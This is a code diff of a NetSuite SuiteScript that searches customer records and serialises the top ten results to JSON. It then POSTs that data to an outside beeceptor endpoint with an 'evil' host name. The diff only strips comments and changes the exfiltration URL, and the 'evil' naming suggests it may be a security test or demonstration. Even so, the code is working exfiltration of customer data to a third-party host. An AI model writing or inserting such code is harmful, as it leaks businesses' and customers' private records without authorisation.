@@ -20,26 +20,23 @@ require(['N/record', 'N/email', 'N/search'], (record, email, search) => {
       ]
   });
   
-  // Fetch the top 10 results
   var results = customerSearchObj.run().getRange({ start: 0, end: 10 });
   var customersArray = [];
   
   results.forEach(function(result) {
       var customerObj = {};
       result.columns.forEach(function(col) {
-          // Use the column label if available; otherwise, use the name
           var key = col.label || col.name;
           customerObj[key] = result.getValue(col);
       });
       customersArray.push(customerObj);
   });
   
-  // Convert results to JSON
   var jsonResults = JSON.stringify(customersArray);
   log.debug("Customer JSON", jsonResults);
 
   var xhr = new XMLHttpRequest();
-  xhr.open('POST', 'https://eviltest.free.beeceptor.com', true);
+  xhr.open('POST', 'https://evil-user-event.free.beeceptor.com', true);
   xhr.setRequestHeader('Content-Type', 'application/json');
   xhr.onload = function() {
     if (xhr.status >= 200 && xhr.status < 300) {
